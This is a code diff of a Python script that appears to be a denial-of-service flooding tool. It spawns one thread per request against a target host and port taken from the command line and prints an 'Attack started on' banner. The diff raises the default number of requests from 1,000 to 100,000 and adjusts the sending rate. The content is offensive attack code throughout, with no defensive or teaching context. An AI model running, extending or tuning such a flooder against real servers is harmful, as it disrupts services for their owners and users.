@@ -57,16 +57,21 @@ def attack():
         dos.close()
 
 
-# def main_ddos_attack():
-    
+def print_message():
+    """Message on the terminal"""
+    print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
+          str(port) + " || # Requests: " + str(num_requests))
+    print("Sending requests...")
+    time.sleep(3)
+
 if __name__ == "__main__":
 
     if len(sys.argv) == 2:
         port = 80
-        num_requests = 1000
+        num_requests = 100000
     elif len(sys.argv) == 3:
         port = int(sys.argv[2])
-        num_requests = 1000
+        num_requests = 100000
     elif len(sys.argv) == 4:
         port = int(sys.argv[2])
         num_requests = int(sys.argv[3])
@@ -87,13 +92,11 @@ if __name__ == "__main__":
     thread_num = 0
     thread_num_mutex = threading.Lock()
 
+    # print the info of the target server
+    print_message()
     # attack
     attack()
-
-
-    print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
-        str(port) + " || # Requests: " + str(num_requests))
-
+    
     # Spawn a thread per request
     all_threads = []
     for i in range(num_requests):
@@ -102,9 +105,8 @@ if __name__ == "__main__":
         all_threads.append(t1)
 
         # Adjusting this sleep time will affect requests per second
-        request_per_second = 0.01
+        request_per_second = 0.15
         time.sleep(request_per_second)
 
     for current_thread in all_threads:
         current_thread.join()  # Make the main thread wait for the children threads
-
